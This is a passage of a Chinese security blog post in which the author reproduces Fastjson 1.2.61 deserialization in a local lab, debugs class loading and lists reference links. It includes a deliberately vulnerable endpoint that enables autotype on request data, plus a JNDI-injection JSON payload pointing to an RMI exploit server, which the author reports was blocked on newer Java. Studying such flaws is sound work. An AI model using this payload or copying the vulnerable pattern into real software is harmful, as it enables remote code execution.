+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-tencentyun<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>external:*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus tencentyun<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://mirrors.cloud.tencent.com/nexus/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>速度飞快啊，然后修改一下后端代码，支持一下 1.2.61 的 autotype 黑名单：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value=&quot;/Fastjson2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">fastjson2</span><span class="params">(Model model, HttpServletRequest request)</span> &#123;</span><br><span class="line">    ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">    JSON.parseObject(data);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1.2.61 的黑名单存在 ParserConfig 类里面，好像是采用了人类无法看懂的十进制进行存储，具体是什么类可以看这：<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a> 。</p>
+<p>运行的时候看到一个报错，虽然无伤大雅但还是解决一下比较好：<a href="https://blog.csdn.net/zhaozhihang1234/article/details/50143903">https://blog.csdn.net/zhaozhihang1234/article/details/50143903</a> ，电脑上的 tomcat 也很老了，涉及 EL 的时候会出错好像，什么时候应该换个新的了。</p>
+<p>现在大概可以开始研究了吧。</p>
+<p>好像不行，运行的时候又遇到一个错误：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodError: com.alibaba.fastjson.parser.ParserConfig.setAutoTypeSupport(Z)V</span><br></pre></td></tr></table></figure>
+
+<p>在网上找到一个脚本：<a href="https://blog.csdn.net/qq_28675967/article/details/90579636">https://blog.csdn.net/qq_28675967/article/details/90579636</a> ，可以检测类是从哪里加载的，我试了一下结果发现它加载的是 target 下面的 1.2.23 版本的 fastjson？里面两个版本的包都有，看来 IDEA 的编译运行还是需要注意一下包的引入的。删掉了 1.2.23 版本的包之后，运行正常了。</p>
+<p>现在我回过头来看看脚本的做法，先用 getProtectionDomain 获取 ProtectionDomain 这个对象，再调用里面的 getCodeSource，这时获取的对象就已经看得出类的来源地了。</p>
+<p>现在终于可以开始测试了，先布置好恶意 class 然后启动 RMI 服务和 Web 服务，我这里好像 Tomcat 和 RMI 服务端口冲突了，需要修改一下 Tomcat 的端口。payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.configuration2.JNDIConfiguration&quot;</span><span class="punctuation">,</span><span class="attr">&quot;prefix&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://127.0.0.1:1098/Exploit&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后报错了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javax.naming.ConfigurationException: The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.</span><br></pre></td></tr></table></figure>
+
+<p>看来这个 payload 最后用到了 JDK 中的 com.sun.jndi.rmi.registry.RegistryContext 类，被 trustURLCodebase 拦截了，所以不能在高版本 Java 里面使用。</p>
+<p>以后有时间整理一下 RMI LDAP JNDI JRMP 相关的东西， 我对这些概念还不是特别熟悉，还有就是反序列化中除了直接加载字节码之外的方式，比如从远程加载序列化字符串绕过前面的反序列化黑名单之类的。</p>
+<hr>
+<p>参考链接：</p>
+<p><a href="https://www.freebuf.com/vuls/178012.html">https://www.freebuf.com/vuls/178012.html</a></p>
+<p><a href="https://www.restran.net/2018/10/29/fastjson-rce-notes/#%E5%9F%BA%E4%BA%8E-JNDI-%E7%9A%84-PoC">https://www.restran.net/2018/10/29/fastjson-rce-notes/#%E5%9F%BA%E4%BA%8E-JNDI-%E7%9A%84-PoC</a></p>
+<p><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf">https://github.com/shengqi158/fastjson-remote-code-execute-poc/blob/master/Java_JSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E6%AE%87_%E7%9C%8B%E9%9B%AA%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E8%80%85%E5%B3%B0%E4%BC%9A.pdf</a></p>
+<p><a href="https://mp.weixin.qq.com/s/Eeq4nFdmM8a57l-tZXfvrQ">https://mp.weixin.qq.com/s/Eeq4nFdmM8a57l-tZXfvrQ</a></p>
+<p><a href="https://paper.seebug.org/636/">https://paper.seebug.org/636/</a></p>
+<p><a href="https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html">https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html</a></p>
+<p><a href="http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/">http://www.yulegeyu.com/2019/01/11/Exploitng-JNDI-Injection-In-Java/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/Java/">Java</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+                    
+                      <a class="hover-with-bg" href="/tags/FastJSON/">FastJSON</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/03/22/%E5%88%92%E6%B0%B4CVE-2019-9194%E5%A4%8D%E7%8E%B0/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>划水CVE-2019-9194复现</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/03/16/wordpress5-1-CSRF-to-XSS-to-RCE%E5%A4%8D%E7%8E%B0/">
+                        <span>wordpress5.1-CSRF_to_XSS_to_RCE复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Java反序列化漏洞-Fastjson&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
